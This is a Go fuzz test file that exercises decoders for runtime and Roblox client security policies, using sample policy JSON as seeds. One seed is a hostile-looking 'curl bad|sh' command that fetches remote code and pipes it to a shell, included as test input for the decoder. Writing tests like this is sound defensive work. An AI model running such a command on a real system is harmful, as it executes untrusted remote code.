package securitypolicy

import (
	"testing"
	"time"
)

func FuzzDecodeRuntime(f *testing.F) {
	f.Add([]byte(`{"schema":"tipsy.runtime-policy.v1","validity":{"sequence":1,"not_before":"2029-01-01T00:00:00Z","expires":"2029-01-02T00:00:00Z"},"minimum_tipsy_version":"1.0.0","required_capabilities":[],"selectors":[{"release_class":"stable","roblox_class":"authorized","kernel_class":"modern","backend_class":"vulkan","profile_id":"linux-strict-v1"}]}`))
	f.Add([]byte(`{"script":"curl bad|sh"}`))
	f.Fuzz(func(t *testing.T, data []byte) {
		_, _ = DecodeRuntime(data, time.Date(2029, 1, 1, 1, 0, 0, 0, time.UTC), 0)
	})
}

func FuzzDecodeRoblox(f *testing.F) {
	f.Add([]byte(`{"schema":"tipsy.roblox-policy.v1","validity":{"sequence":1,"not_before":"2029-01-01T00:00:00Z","expires":"2029-01-02T00:00:00Z"},"package_name":"com.roblox.client","platform":"android","architecture":"x86_64","min_version_code":1,"max_version_code":2,"allowed_splits":["base"],"signer_lineages":[{"id":"main","sha256":["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"],"min_version_code":1,"max_version_code":2}]}`))
	f.Add([]byte("null"))
	f.Fuzz(func(t *testing.T, data []byte) {
		_, _ = DecodeRoblox(data, time.Date(2029, 1, 1, 1, 0, 0, 0, time.UTC), 0)
	})
}
